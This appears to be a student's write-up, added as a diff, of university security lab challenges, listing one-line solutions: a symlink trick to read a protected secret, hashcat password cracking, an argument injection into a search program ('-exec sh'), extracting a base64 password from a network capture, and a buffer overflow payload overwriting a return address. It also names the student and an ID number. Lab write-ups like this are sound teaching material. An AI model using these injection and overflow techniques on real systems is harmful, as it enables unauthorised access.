@@ -1,0 +1,16 @@
+name: Kumal Patel
+asuid: 1208493243
+
+read-secret: ran ln -s /var/challenge/read-secret/.secret .secret  to create a symbolic link then ran ./read-secret and executed l33t
+
+groups : ran newgrp groups to add user to group then we were given a hash for the password and used hashcat to find the real password, being password
+
+search: created a file called file that executes l33t which is done in the sh script ./search "file -exec sh {} \\;" 
+
+just-execute-me: execute the file
+
+secure-this-house: change locks to gain entry into house
+
+find-that-pass: used scp to copy the network_trace into my local machine, then used http.request.method == POST, to find the password. which was hashed by a base64 encoder, so decoding that gave us the password
+
+basic-overflow: ran this python script based on watching vids on basic overflow ./basic-overflow $(python -c 'print "d"*28 + "\xd6\x84\x04\x08"')
